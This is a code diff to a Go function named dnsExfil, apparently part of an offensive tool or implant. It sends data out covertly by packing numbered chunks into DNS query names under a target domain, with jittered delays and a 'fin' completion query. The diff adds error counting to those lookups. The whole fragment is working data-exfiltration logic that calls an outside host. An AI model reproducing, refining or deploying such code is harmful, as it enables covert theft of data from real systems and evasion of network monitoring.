@@ -96,8 +96,9 @@ func dnsExfil(args dnsArgs) structs.CommandResult {
 		// Build DNS query: <seq>.<chunk>.<domain>
 		query := fmt.Sprintf("%06d.%s.%s", i, chunk, args.Target)
 
-		// Perform DNS lookup (we don't care about the response)
-		_, _ = net.LookupHost(query)
+		if _, err := net.LookupHost(query); err != nil {
+			errors++
+		}
 		sent++
 
 		// Delay with jitter
@@ -108,9 +109,10 @@ func dnsExfil(args dnsArgs) structs.CommandResult {
 		time.Sleep(time.Duration(sleepMs) * time.Millisecond)
 	}
 
-	// Send completion marker
 	completionQuery := fmt.Sprintf("fin.%06d.%s", totalChunks, args.Target)
-	_, _ = net.LookupHost(completionQuery)
+	if _, err := net.LookupHost(completionQuery); err != nil {
+		errors++
+	}
 
 	sb.WriteString("Exfiltration Complete\n")
 	sb.WriteString(fmt.Sprintf("  Sent: %d/%d chunks\n", sent, totalChunks))
